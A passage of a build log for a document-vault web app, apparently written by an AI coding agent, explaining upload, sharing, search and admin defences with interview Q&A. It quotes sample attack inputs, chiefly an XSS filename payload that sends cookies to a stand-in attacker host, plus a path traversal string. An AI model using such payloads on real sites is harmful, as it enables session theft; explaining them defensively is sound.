1. **Unrestricted File Upload & Remote Code Execution (CWE-434):**
   - The UI guides users toward allowed document formats (PDF, JPEG, PNG, WEBP). On the server, `multer` enforces file extension constraints, and `file-type` inspects binary magic bytes, preventing `.php`, `.jsp`, or executable scripts disguised with fake extensions from ever entering disk storage.
2. **Denial of Service via Storage & Memory Exhaustion (CWE-400 / CWE-770):**
   - Both client-side feedback and backend limits restrict file sizes to 5 MB (`limits: { fileSize: 5 * 1024 * 1024 }`), stopping resource exhaustion attacks and memory spikes during SHA-256 calculation.
3. **Zero-Byte File Cluttering / Descriptor Leaks:**
   - Empty files (0 bytes) are rejected both by server validation (`Empty files are not allowed`) and immediately surfaced in the UI error box, preventing database clutter and wasted storage metadata.
4. **Path Traversal via Filename Manipulation (CWE-22):**
   - Malicious filenames containing directory traversal sequences (e.g. `../../../etc/passwd`) are detected and rejected on the server with status 400. The UI catches this error and warns the user with a "Security Violation: Path Traversal Detected" banner.
5. **Stored Cross-Site Scripting (XSS / CWE-79):**
   - All user-supplied metadata—including document names, tags, and categories—are rendered purely as plain-text text nodes, completely preventing `<script>` or event handler injection.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why must file validation rely on magic bytes (file signatures) rather than MIME types sent in HTTP headers or file extensions, and how does TrustVault handle validation errors?
**Answer:**
1. **The Flaw of Client-Provided Metadata:**
   - The MIME type sent in the `Content-Type` header (e.g., `image/png`) and the file extension (e.g., `.png`) are untrusted user input supplied directly by the HTTP client. An attacker can rename a malicious executable or web shell (`shell.php`) to `invoice.pdf` or manually craft an HTTP request setting `Content-Type: application/pdf`.
2. **Magic Byte Verification:**
   - File signatures ("magic bytes") are fixed hexadecimal byte sequences at the very beginning of a file (e.g., `%PDF-` or `25 50 44 46` for PDF; `FF D8 FF` for JPEG; `89 50 4E 47` for PNG).
   - In TrustVault, `documentService` reads the file buffer using the `file-type` package, which inspects these binary signatures directly. If an attacker submits a PHP script renamed to `.png`, `fileTypeFromBuffer` detects the discrepancy and rejects the upload with HTTP 400: *"File content does not match declared type (spoofed extension)"*.
3. **UI Feedback Architecture:**
   - When Express rejects the upload, `DocumentsPage` captures the HTTP 400 response, categorizes the failure under `Validation Failed: Wrong File Type`, and displays the exact reason along with security hints without crashing the application.

#### Question 2: Why should document downloads always route through an authenticated backend handler rather than linking directly to static files stored on disk or a public CDN bucket?
**Answer:**
1. **Broken Object Level Authorization (BOLA / IDOR):**
   - If files are served statically from a web server or public S3 bucket (e.g., `/static/uploads/report.pdf`), anyone who obtains or guesses the file path can download the document directly, completely bypassing authentication and role-based access control.
2. **Dynamic Permission Verification:**
   - In TrustVault, permission grants can be revoked at any time by the document owner. Serving files through `/api/documents/:id/download` guarantees that:
     - The user session is verified.
     - `authorize(user, doc, 'read')` queries the database in real time with zero caching.
     - If the user's permission was revoked, the request returns HTTP 404 (cloaking existence).
     - Every successful or denied download attempt is recorded in the tamper-evident `AuditEvent` hash chain.
3. **Safe Storage Isolation:**
   - Files are stored on disk in a private directory outside the web root (`backend/storage/`) using random UUIDs rather than original filenames, eliminating direct path traversal or execution risks.

#### Question 3: How does rendering tags and filenames as plain text in React prevent Stored Cross-Site Scripting (XSS), and why is `dangerouslySetInnerHTML` forbidden?
**Answer:**
1. **Stored XSS Attack Vector:**
   - An attacker might upload a file named `<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>` or add a tag `<svg onload=alert(1)>`. If the application renders this string inside the DOM using `element.innerHTML` or React's `dangerouslySetInnerHTML`, the browser parses the HTML tags and executes the malicious JavaScript payload in the context of any user viewing the documents list.
2. **React's Safe Default Escaping:**
   - Standard JSX expressions like `<div>{doc.name}</div>` and `<span>#{tag}</span>` treat variables as string literals. React converts characters like `<`, `>`, `&`, `"`, and `'` into their safe HTML entity representations (`&lt;`, `&gt;`), ensuring the browser renders them strictly as visual text rather than executable markup.
3. **TrustVault Defense:**
   - TrustVault strictly forbids `dangerouslySetInnerHTML` throughout the entire codebase, ensuring that even if an attacker manages to store a malicious payload in a document title or tag, it is harmlessly rendered as plain text.

---

## Build Entry: Document Detail Page — Download, Metadata Edit, File Replacement & Delete Confirmation
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- Implemented the full-featured **Document Detail Page** in [`client/src/pages/DocumentDetailPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentDetailPage.jsx).
- **Secure File Download:**
  - Integrated high-prominence download hero button executing authenticated requests to `/api/documents/:id/download`.
  - Streams file binaries as browser attachments without ever exposing local storage paths or unauthenticated URLs.
- **Permission-Isolated Controls (Strict Rule 4 Enforcement):**
  - **Edit Form (Metadata & File Replacement):** Rendered **ONLY** if the requesting user is the document owner or has been granted an `'edit'` permission level.
  - **Delete Button (with Confirmation Modal):** Rendered **ONLY** if the requesting user is the document owner (`permissions.canDelete === true`). Viewers (even with edit grants) and non-owners cannot delete documents.
  - **Read-Only Access Card:** Rendered when a user has read-only permission (`level: 'read'`), clearly informing them that edit and deletion capabilities are restricted.
- **Edit Form (Dual Tabs):**
  - **Tab 1 — Edit Metadata:** Name/title, category selection, tags (comma-separated), and description text area, submitting via `PATCH /api/documents/:id`.
  - **Tab 2 — File Replacement:** Drag-and-drop replacement file zone submitting via `POST /api/documents/:id/replace`. Automatically captures new SHA-256 digests and displays categorized server validation errors (wrong type, too large, empty file, path traversal).
- **Delete Confirmation Modal:**
  - Accessible modal dialog requiring explicit user confirmation before issuing soft-deletion (`DELETE /api/documents/:id`).
  - Warns the user of the permanent nature of soft-deletion and the immutable audit record creation.
- **Backend API & Route Harmonization:**
  - Enhanced `GET /documents/:id` in [`backend/src/routes/documents.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/routes/documents.js) to compute and attach `permissions: { isOwner, canEdit, canDelete, level }` and `ownerEmail`.
  - Enhanced `updateDocumentMetadata` in [`backend/src/services/documentService.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/services/documentService.js) to seamlessly accept both string and array representations of tags.
  - Added 5 automated integration tests in [`backend/tests/documents.test.js`](file:///c:/Users/jithe/coding/TrustValut/backend/tests/documents.test.js) verifying detail endpoint authorization boundaries.
- **Client Application Wiring & Navigation:**
  - Added `/documents/:id` route in [`client/src/App.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/App.jsx).
  - Linked document rows and titles in [`client/src/pages/DocumentsPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentsPage.jsx) and [`client/src/pages/SearchPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/SearchPage.jsx) to the detail page.
  - Styled with Vanilla CSS in [`client/src/index.css`](file:///c:/Users/jithe/coding/TrustValut/client/src/index.css).

---

### 2. Which Files Were Created / Modified
| File | Action | Purpose |
|---|---|---|
| [`client/src/pages/DocumentDetailPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentDetailPage.jsx) | Created | Document detail view with download link, metadata edit form, file replacement, and delete confirmation modal. |
| [`client/src/App.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/App.jsx) | Modified | Added `/documents/:id` protected route pointing to `DocumentDetailPage`. |
| [`client/src/pages/DocumentsPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/DocumentsPage.jsx) | Modified | Linked document names and added inspect action button to the documents table. |
| [`client/src/pages/SearchPage.jsx`](file:///c:/Users/jithe/coding/TrustValut/client/src/pages/SearchPage.jsx) | Modified | Linked search results to Document Detail page. |
| [`client/src/index.css`](file:///c:/Users/jithe/coding/TrustValut/client/src/index.css) | Modified | Added styling for breadcrumb navigation, cryptographic specs grid, tabs, forms, and delete modal. |
| [`backend/src/routes/documents.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/routes/documents.js) | Modified | Added computed permissions (`isOwner`, `canEdit`, `canDelete`, `level`) and `ownerEmail` to `GET /:id`. |
| [`backend/src/services/documentService.js`](file:///c:/Users/jithe/coding/TrustValut/backend/src/services/documentService.js) | Modified | Supported string and array parsing in `updateDocumentMetadata`. |
| [`backend/tests/documents.test.js`](file:///c:/Users/jithe/coding/TrustValut/backend/tests/documents.test.js) | Modified | Added 5 integration tests covering owner, edit-viewer, read-viewer, unshared (404), and unauth (401). |
| [`docs/BUILD_LOG.md`](file:///c:/Users/jithe/coding/TrustValut/docs/BUILD_LOG.md) | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Server-Driven Permission Flags with Backend Enforcement:**
  - While the frontend inspects `permissions.canEdit` and `permissions.canDelete` to selectively render or hide UI controls, the Express backend enforces the actual security policy at the Policy Decision Point via `authorize(user, doc, action)`. Hiding the delete button prevents user confusion, while backend checks guarantee that even a manually forged `DELETE` request from a non-owner returns HTTP 404 and writes an `ACCESS_DENIED` audit event.
- **Cryptographic Transparency:**
  - Displaying the computed SHA-256 digest alongside a "Verified" badge allows users to verify cryptographic file integrity against local hashes. When a file is replaced, the new SHA-256 is recalculated, persisted, and recorded alongside the previous hash in the immutable audit log (`FILE_REPLACE`).
- **Confirmation Modals for Destructive Operations:**
  - Soft-deleting a document marks `deletedAt` and immediately renders the document inaccessible across all endpoints. Presenting a confirmation modal prevents accidental deletions while clearly communicating that an immutable record of the deletion is sealed into the audit hash chain.
- **Universal 404 Cloaking:**
  - If a user attempts to load `/documents/:id` for a document they have no permission to access, Express returns HTTP 404 (per Rule 3). The React application catches this status and immediately renders `NotFoundPage`, preventing attackers from enumerating valid document ObjectIds.

---

### 4. What Attacks This Design Prevents
1. **Broken Object-Level Authorization (BOLA / IDOR / CWE-639):**
   - Both `GET /documents/:id`, `PATCH /documents/:id`, `POST /documents/:id/replace`, and `DELETE /documents/:id` pass through `authorize(user, doc, action)`. Tampering with document IDs in the URL never allows unauthorized access.
2. **Privilege Escalation via Direct API Calls (CWE-285):**
   - A viewer with a `'read'` grant cannot edit metadata or replace the physical file; any direct HTTP `PATCH` or `POST /replace` request returns HTTP 404.
   - A viewer with an `'edit'` grant cannot delete the document; any direct HTTP `DELETE` request returns HTTP 404.
3. **Cross-Site Request Forgery (CSRF / CWE-352):**
   - All state-changing requests (`PATCH`, `POST`, `DELETE`) require the custom `x-csrf-token` header validated with HMAC-SHA256 on Express.
4. **Stored Cross-Site Scripting (XSS / CWE-79):**
   - Document titles, original filenames, descriptions, and tags are rendered as React plain-text text nodes, completely preventing script injection from malicious document metadata.
5. **Accidental / Malicious File Tampering Without Audit Trail (CWE-778):**
   - Every file replacement records both `oldSha256` and `newSha256` into the SHA-256 chained audit trail, ensuring complete non-repudiation.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why should an application combine client-side conditional rendering (e.g., hiding edit/delete buttons) with strict server-side authorization enforcement, and what are the risks of relying on only one?
**Answer:**
1. **The Flaw of Client-Side Only Enforcement:**
   - Any client-side logic (JavaScript, React state, hidden buttons) can be trivially bypassed by an attacker using browser developer tools, proxy tools (e.g. Burp Suite), or raw HTTP clients (`curl`). If the server does not enforce permissions on incoming requests, an attacker can simply issue `DELETE /api/documents/:id` directly and delete unauthorized resources.
2. **The Flaw of Server-Side Only Enforcement (Poor UX):**
   - If an application relies solely on server-side rejection without adjusting the UI, users with read-only access are presented with edit forms and delete buttons that will inevitably fail upon submission. This creates frustration and generates excessive error logs.
3. **The Dual Defense Model:**
   - TrustVault uses server-computed permission flags (`permissions: { canEdit, canDelete }`) purely to provide an intuitive user experience (hiding actions the user cannot perform). Concurrently, Express enforces `authorize(user, doc, action)` on every state-changing route with zero caching, ensuring absolute security regardless of client behavior.

#### Question 2: In a secure file vault, why must file replacement record both the old and new SHA-256 hashes in an immutable audit chain rather than merely overwriting the file on disk?
**Answer:**
1. **Non-Repudiation and Forensic Integrity:**
   - Overwriting a file without cryptographic history destroys the chain of custody. An attacker or rogue employee could replace a sensitive legal contract with a fraudulent version and claim the altered file was the original upload.
2. **Audit Hash Chaining in TrustVault:**
   - When `replaceDocumentFile` executes, it calculates `newSha256` and logs a `FILE_REPLACE` event containing both `oldSha256` and `newSha256` in the event metadata.
   - Because each audit event stores the SHA-256 hash of the previous event plus its own contents, the replacement event is permanently sealed into the linear chain. Any attempt to alter past file history breaks `verifyChain()`.
3. **Storage Isolation:**
   - The new file is stored under a fresh UUID filename in private storage, preventing race conditions or disk caching collisions during replacement.

#### Question 3: How does soft-deletion with 404 response codes fulfill both audit compliance and anti-enumeration requirements?
**Answer:**
1. **Compliance through Record Retention:**
   - Hard-deleting a document row (`Document.findByIdAndDelete()`) would orphan historical audit events referencing that `documentId`. By setting `deletedAt: new Date()`, the document record remains in the database so audit logs can continue referencing its identity and lineage.
2. **Anti-Enumeration through 404 Cloaking:**
   - In accordance with Rule 3, once `doc.deletedAt` is populated, `authorize(user, doc, action)` treats the document as non-existent and returns HTTP 404 for all users and all operations.
   - Attackers probing deleted document IDs receive the exact same 404 response as a non-existent document, preventing information leakage about former document existence.

---

## Build Entry: Document Detail Sharing Panel (Owner-Only Access Management, Name-Based Granting, Revocation & Audit Verification)
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Owner-Exclusive Sharing & Access Control Panel (`client/src/pages/DocumentDetailPage.jsx`):**
  - Rendered strictly when `permissions.isOwner === true`. Non-owners (including viewers with `read` or `edit` permissions) and administrators never see this panel or any sharing controls.
  - **Active Access List Table (`#sharing-access-table`):**
    - Displays all users with active access to the document:
      - Primary document owner row with non-revocable badge (`⭐ Owner`).
      - Granted users with avatar initials, name, email address, access level badge (`READ` in cyan or `EDIT` in emerald), and grant timestamp.
      - Clean empty state when no other users have been granted access.
  - **Grant Access Form by Name (`#form-grant-permission`):**
    - Single input field accepting user name, username prefix (e.g. `'viewer'`), or full email (e.g. `'viewer@trustvault.local'`).
    - Permission level dropdown selector with clear capability labels: `Read (View & Download)` or `Edit (View, Download, Edit & Replace)`.
    - Real-time inline feedback alerts for grant success (`#grant-success-alert`) and server error rejection (`#grant-error-alert`).
  - **Inline Revocation Action with Confirmation Modal (`#btn-revoke-*`):**
    - Dedicated "Revoke" button beside each granted person with danger styling and loading spinner during in-flight network requests.
    - Confirmation modal dialog requiring explicit confirmation prior to revocation, detailing immediate access termination and audit recording.
    - Real-time feedback alerts for revocation success (`#revoke-success-alert`) and immediate optimistic removal from the UI table.
- **Backend API & Service Integration (`backend/src/services/documentService.js` & `backend/src/routes/documents.js`):**
  - `GET /documents/:id/permissions`:
    - Secured via `authorize(user, doc, 'grant')` (Rule 4: Owner-only; non-owners receive 404 Not Found per Rule 3).
    - Populates user email and role from MongoDB, returning an array of active permission records sorted newest first.
  - `POST /documents/:id/permissions`:
    - Enforces `authorize(user, doc, 'grant')`.
    - Resolves target user by exact email match or case-insensitive regex name prefix (`^<name>(@|$)`).
    - Explicitly blocks document owners from granting permissions to themselves with HTTP 400.
    - Upserts permission record in MongoDB (`findOneAndUpdate` with `upsert: true`).
    - Emits `PERMISSION_GRANT` audit event into the linear SHA-256 hash chain with IP address and user-agent metadata.
  - `DELETE /documents/:id/permissions/:userId`:
    - Enforces `authorize(user, doc, 'grant')`.
    - Removes permission record from MongoDB.
    - Emits `PERMISSION_REVOKE` audit event into the linear SHA-256 hash chain.
- **Automated Integration Test Suite (`backend/tests/documents.test.js`):**
  - 10 new integration tests validating listing, granting by name, granting by email, self-grant rejection, non-existent user handling, non-owner rejection (404), revocation flow, immediate access cut-off (404 for download and view), and audit event verification.
- **Aesthetic Styling (`client/src/index.css`):**
  - Fully styled using curated Vanilla CSS tokens with dark glassmorphic cards, gradient top borders, avatar badges, level pills, and responsive mobile grid layouts.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `client/src/pages/DocumentDetailPage.jsx` | Modified | Added owner-only Sharing panel, user access table, grant form by name, revoke buttons, and confirmation modal. |
| `client/src/index.css` | Modified | Appended CSS classes for sharing card, access list table, avatar badges, level pills, revoke buttons, and responsive grid. |
| `backend/src/routes/documents.js` | Modified | Exposed `GET /documents/:id/permissions` and provided `permissionsList` in `GET /documents/:id` response without mutating permission shape. |
| `backend/src/services/documentService.js` | Modified | Implemented `listDocumentPermissions()`, name/email resolution in `grantPermission()`, and self-grant prevention. |
| `backend/tests/documents.test.js` | Modified | Added 10 tests verifying permissions listing, name-based granting, revocation, and 404 security rules. |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Strict Owner-Only Authority (Rule 4):**
  - Under TrustVault's security model, even viewers with `edit` permissions are strictly prohibited from granting or revoking document permissions. Only the document owner possesses `grant` authority.
  - By rendering the Sharing panel conditionally on `permissions.isOwner === true` and enforcing `authorize(user, doc, 'grant')` on the Express API, the design achieves complete defense-in-depth.
- **Name-Based User Resolution with Prefix Matching:**
  - Users typically think in terms of colleagues' names (e.g., "viewer", "alice") rather than remembering full email domains or raw database ObjectIds. Resolving names against email usernames (`alice` matching `alice@trustvault.local`) provides a frictionless user experience while rejecting non-existent users with clean 404 errors.
- **Two-Step Revocation Confirmation:**
  - Revoking access is a critical access control change that immediately cuts off user access and seals an audit record. A confirmation modal prevents accidental button clicks while clearly explaining the forensic implications.
- **Immediate State Synchronization:**
  - After granting access, the permissions list is automatically re-fetched to reflect the new state. When revoking, the revoked user is immediately filtered out of the component state, providing instant visual feedback.

---

### 4. What Attacks This Design Prevents
1. **Unauthorized Access Granting by Viewers (Horizontal Privilege Escalation / CWE-284):**
   - A malicious user with granted `edit` rights cannot share the document with an accomplice. The Express backend enforces `authorize(user, doc, 'grant')` which throws 404 for non-owners.
2. **Access Revocation Bypasses (CWE-285):**
   - Because `authorize()` queries the database at the instant of access, revoking a permission in the Sharing panel immediately cuts off access. Subsequent requests by the revoked user return HTTP 404 immediately.
3. **Information Disclosure via ACL Probing (CWE-200 / Rule 3):**
   - Non-owners attempting to inspect the document's access list via `GET /api/documents/:id/permissions` receive HTTP 404 (never 403), preventing them from learning who else has access to the document.
4. **Self-Granting Ownership Tampering (CWE-269):**
   - The backend explicitly rejects owners attempting to grant permissions to themselves, preventing corrupted ACL states.
5. **Cross-Site Request Forgery (CSRF / CWE-352):**
   - Granting and revoking permissions require custom `x-csrf-token` headers validated with HMAC-SHA256, blocking CSRF attacks from external malicious sites.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why must access control lists (ACLs) be queryable and manageable strictly by resource owners rather than any user with edit permissions, and how does `authorize()` enforce this separation?
**Answer:**
1. **The Principle of Least Privilege and Separation of Duties:**
   - A user granted `edit` permission is authorized to update content (e.g., fix a typo, replace a financial spreadsheet), but is *not* the owner of the data asset. Granting an editor the authority to manage the ACL would allow them to exfiltrate data by granting access to unauthorized third parties or locking out other authorized users.
2. **Enforcement in `authorize()`:**
   - In `backend/src/authz.js`, the action `'grant'` is handled with positive validation:
     ```javascript
     if (action === 'grant') {
       if (isOwner) return true;
       return deny('Only the owner can grant permissions');
     }
     ```
   - Because `grant` immediately rejects any user who is not the document owner, even viewers with `level === 'edit'` are denied with HTTP 404.

#### Question 2: How does TrustVault guarantee that permission revocations take immediate effect without leaving window-of-vulnerability gaps?
**Answer:**
1. **The Token Stale Cache Problem:**
   - In systems where permissions are embedded in client JWT claims, revoking access in the database does not affect the user until their JWT expires (often minutes or hours later), leaving a dangerous window of vulnerability.
2. **Dynamic Database Authorization:**
   - TrustVault does not store document permissions in session cookies or tokens. Every document route passes through `authorize()`, which queries MongoDB (`Permission.findOne({ documentId, userId })`) in real-time.
   - When the owner clicks "Revoke", the backend executes `Permission.deleteOne()` and commits the deletion to MongoDB.
   - Any concurrent or subsequent request from the revoked user immediately evaluates `Permission.findOne` to `null` and is rejected with HTTP 404 within milliseconds.

#### Question 3: Why should administrative users without document ownership be blocked from inspecting or managing a document's sharing list?
**Answer:**
1. **Confidentiality and Metadata Privacy:**
   - Learning who has access to a sensitive document (e.g., an internal investigation, whistleblowing report, or merger plan) leaks confidential organizational intelligence even if file contents cannot be read.
2. **Enforcement of Rule 4:**
   - TrustVault enforces that administrators have zero automatic access to document contents or document permissions. Admin calls to `GET /documents/:id/permissions` fail with 404 Not Found unless the admin happens to be the document owner.

---

## Build Entry: Documents Page Search Bar & Multi-Criteria Filtering (Name, Owner, Category, Date Range)
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Interactive Search & Multi-Filter Card on Documents Page (`client/src/pages/DocumentsPage.jsx`):**
  - **Main Hero Search Bar (`#search-query-input`):**
    - Prominent search input with icon badge and clear button for full-text search across document title, filename, tags, and description.
  - **Detailed Filter Grid (`.filters-grid-row`):**
    - **Name Filter (`#filter-name-input`):** Dedicated text filter targeting `name`, `title`, and `originalFileName`.
    - **Owner Filter (`#filter-owner-input`):** Dedicated text filter supporting full owner email addresses (e.g. `owner@trustvault.local`) and username/email prefixes (e.g. `owner` or `viewer`).
    - **Category Filter (`#filter-category-select`):** Dropdown selector supporting `All Categories`, `General`, `Financial`, `Legal`, `Technical`, and `Confidential`.
    - **Date Range Filter (`#filter-start-date` & `#filter-end-date`):** Native HTML5 dark-mode date inputs allowing users to define start and end creation dates.
  - **Active Filter Counter & Quick Reset:**
    - Live pill indicator showing the exact number of active filters.
    - One-click "Reset Filters" / "Clear All" button returning to the full vault view.
  - **Seamless Search API Integration:**
    - Calls `GET /api/documents/search` with dynamic query strings (`?q=...&name=...&owner=...&category=...&startDate=...&endDate=...`).
    - Automatically falls back to `GET /api/documents` when all filters are cleared.
    - Tailored empty state (`#empty-documents-card`) clearly distinguishing between an empty vault and zero matches for search criteria.
- **Backend Search Service Enhancements (`backend/src/services/documentService.js`):**
  - Enhanced owner filtering in `listDocuments` to resolve users by username/email prefix (e.g. `owner` matching `owner@trustvault.local`) as well as exact email and ObjectId.
  - Added end-of-day expansion (`T23:59:59.999Z`) for `YYYY-MM-DD` formatted `endDate` parameters, ensuring documents created later on the same day are included.
  - Strict enforcement of Rule 6: all permission filters (`owner: user._id` or `_id: { $in: grantedDocIds }`) and search criteria are evaluated simultaneously inside MongoDB.
- **Modern Glassmorphic Styling (`client/src/index.css`):**
  - Added CSS classes for `.search-filter-card`, `.search-hero-input`, `.filters-grid-row`, `.date-range-inputs`, and responsive mobile layouts.
- **Integration Test Suite Extensions (`backend/tests/search.test.js`):**
  - Added tests for owner username prefix filtering.
  - Added multi-criteria test suite verifying that combined name, owner, category, and date range filters return exact matching results while excluding non-matching documents.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `client/src/pages/DocumentsPage.jsx` | Modified | Integrated search bar, 4-way filter grid, active filter pill, and search API calling. |
| `client/src/index.css` | Modified | Added styling for search card, hero search input, filter grid, date range pickers, and responsive views. |
| `backend/src/services/documentService.js` | Modified | Enhanced owner resolution by username prefix and full-day date boundary handling. |
| `backend/tests/search.test.js` | Modified | Added tests for owner name prefix search and multi-criteria combined query filtering. |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Single Page Document Management Experience:**
  - Rather than requiring users to navigate to a separate search page, integrating search and multi-criteria filtering directly into the primary Documents page allows immediate discovery within the main document table.
- **Strict Database-Level Zero Information Leakage (Rule 6):**
  - In a secure document vault, the number of search results must never reveal the existence of documents the user is not authorized to see. Executing search filters strictly inside MongoDB alongside the user's permission clause guarantees that unauthorized documents are never matched, counted, or transferred to Express memory.
- **Frictionless Filter Resetting:**
  - Complex multi-criteria filters often yield zero results when over-constrained. Providing prominent "Reset Filters" and "Clear Search" actions allows users to quickly recover without manually erasing each input field.

---

### 4. What Attacks This Design Prevents
1. **Side-Channel Information Leakage via Search Counts (CWE-200 / Rule 6):**
   - Searching for a keyword present in 40 documents where the user has access to only 3 returns a count of 3, never 40. The user cannot deduce how many confidential files exist in the vault.
2. **Horizontal Privilege Escalation & IDOR via Search (CWE-639 / CWE-284):**
   - Even if an attacker specifies the exact name, category, or owner of another user's secret document, MongoDB filters it out at the database level.
3. **NoSQL / Regex Injection (CWE-943):**
   - All string search criteria (name, owner, category, keywords) have special regex meta-characters (`.*+?^${}()|[]\`) strictly escaped before building MongoDB RegExp queries, preventing query manipulation and catastrophic backtracking (ReDoS).
4. **Time-Based Boundary Omissions:**
   - Appending `T23:59:59.999Z` to date-only `endDate` parameters prevents subtle date truncation attacks where newly updated documents on the boundary date are mysteriously omitted.

---

### 5. Technical Interview Questions & Answers

#### Question 1: How does TrustVault prevent search result count side-channel leaks (Rule 6), and why is post-query filtering in JavaScript a fatal security flaw in multi-tenant vaults?
**Answer:**
1. **The Post-Query Filtering Flaw:**
   - In insecure architectures, developers query the database for all matching documents (e.g. `Document.find({ category: 'legal' })`) and subsequently filter the results in JavaScript: `docs.filter(d => authorize(user, d, 'read'))`.
   - If the API returns `{ totalCount: docs.length, results: filteredDocs }` or uses pagination offsets based on the raw query count, an unauthorized user can determine exactly how many confidential legal documents exist in the organization.
2. **Native MongoDB Permission Filtering in TrustVault:**
   - TrustVault compiles the user's authorization boundary directly into the MongoDB query object:
     ```javascript
     const conditions = [
       { deletedAt: null },
       { $or: [{ owner: user._id }, { _id: { $in: grantedDocIds } }] },
       ...searchCriteria
     ];
     ```
   - MongoDB only touches and counts documents that the user is permitted to see. The query count returned is mathematically identical to the accessible result count, leaking zero metadata.

#### Question 2: Why must user-supplied search strings be escaped with a regex sanitizer before being passed to `new RegExp()` in Mongoose queries?
**Answer:**
1. **NoSQL Injection and Regular Expression Denial of Service (ReDoS):**
   - If an unescaped user string containing regex operators (such as `.*`, `(a+)+$`, or `^`) is passed directly to `new RegExp(userString)`, an attacker can craft payloads that cause exponential backtracking, freezing the Node.js event loop and causing a complete denial of service.
2. **Logic Manipulation:**
   - An attacker typing `.*` could bypass exact matching constraints or trigger unintended wildcards across index fields.
3. **TrustVault Defense:**
   - All text inputs pass through:
     ```javascript
     const escaped = str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
     ```
   - This ensures that characters like `.`, `*`, `+`, `?` are treated as literal text characters rather than regex operators.

#### Question 3: How does the backend ensure that filtering by an owner who does not exist does not inadvertently return all documents?
**Answer:**
1. **Fail-Closed Condition Construction:**
   - If a user filters by `owner=nonexistent_user`, `User.find()` returns an empty array `[]`.
   - If the code simply skipped adding an owner condition when no user was found, the query would fall through to searching all accessible documents without an owner restriction, confusing the user and producing incorrect results.
2. **Dummy Match Defense:**
   - TrustVault explicitly appends a non-matching condition:
     ```javascript
     if (resolvedOwnerIds.length > 0) {
       conditions.push({ $or: [{ owner: { $in: resolvedOwnerIds } }, { ownerId: { $in: resolvedOwnerIds } }] });
     } else {
       conditions.push({ _id: new mongoose.Types.ObjectId() });
     }
     ```
   - The query fails closed and safely returns zero results.

---

## Build Entry: Admin Console (User Management, Activity Feed, Permission History, and Verify Audit Chain)
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Complete Administration & Audit Console (`client/src/pages/AdminPage.jsx`):**
  - **Cryptographic Audit Chain Verification (“Verify audit chain” Action):**
    - Prominent header button (`#btn-verify-chain`) that executes `POST /api/admin/verify-chain`.
    - High-contrast visual banner displaying an unambiguous **PASS** (emerald glow) or **FAIL** (crimson pulse) status.
    - Verified event count, latest SHA-256 block hash, verification timestamp, and broken sequence identification upon tampering.
  - **Tab 1: User Management (`#panel-user-management`):**
    - **Create User Card (`#form-create-user`):** Provision new user accounts with Argon2id password hashing, email validation, and role assignment (`user` vs `admin`).
    - **User Directory Table (`.admin-users-table`):** Lists all registered users with avatar monograms, role badges, and active/disabled status pills.
    - **Role Switching:** In-place role toggle (`user` <-> `admin`) via `PATCH /api/admin/users/:id/role`.
    - **Account Disablement & Confirmation Modal (`#btn-confirm-disable`):** Disables target user via `POST /api/admin/users/:id/disable` and immediately terminates all active sessions in memory and MongoDB session stores.
  - **Tab 2: Activity Feed (`#panel-activity-feed`):**
    - **Multi-Criteria Filter Card (`#form-filter-activity`):** Query activity logs by user (email or ID), document (name or ID), start date, end date, event type, and outcome status (`SUCCESS`, `DENIED`, `FAILURE`).
    - **System-Wide Activity Stream Table:** Displays monotonic sequence numbers, timestamps, event types, actions, actors, document names, and truncated SHA-256 hash pointers.
    - **Rule 4 & Prompt Enforcement:** Strictly metadata only. Zero file contents, zero download links, and zero preview triggers are rendered.
  - **Tab 3: Permission-Change History (`#panel-permission-history`):**
    - **Filtered Permission History (`#form-filter-permissions`):** Query historical records of `PERMISSION_GRANT` and `PERMISSION_REVOKE` events filterable by user, document, and date range.
    - **Permission Modification Table:** Displays timestamp, change type (GRANT vs REVOKE), target user, document name, granted access level (`READ` vs `EDIT`), and initiator actor.
    - **Rule 4 Enforcement:** Strictly metadata only; no file contents or download links.
- **Backend Enhancements & Parity (`backend/src/routes/admin.js` & `backend/src/services/adminService.js`):**
  - Added `GET /admin/users` and `GET /api/admin/users` to return all registered user accounts excluding password hashes.
  - Enhanced date-range filtering in `adminService.getActivityFeed` to expand `YYYY-MM-DD` end dates to full-day inclusive boundaries (`T23:59:59.999Z`).
  - Strict metadata sanitization removing `storagePath`, `fileStorageName`, `content`, and any download URL triggers from all audit activity payloads.
- **Client Routing & Glassmorphic Styling (`client/src/App.jsx` & `client/src/index.css`):**
  - Added `<Route path="/admin/:tab" element={<ProtectedRoute allowedRoles={['admin']}><AdminPage /></ProtectedRoute>} />`.
  - Added CSS design tokens and layout classes for `.btn-verify-chain`, `.verify-result-banner` (PASS/FAIL variants), `.admin-tabs-nav`, `.admin-users-table`, `.modal-box-danger`, and `.admin-filter-card`.
- **Automated Test Coverage (`backend/tests/admin.test.js` & `backend/tests/admin-activity.test.js`):**
  - 40 tests covering user listing, creation, role modification, immediate session revocation upon disablement, activity stream filtering, permission history, and audit chain verification (219 total passing tests across all 12 test suites).

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
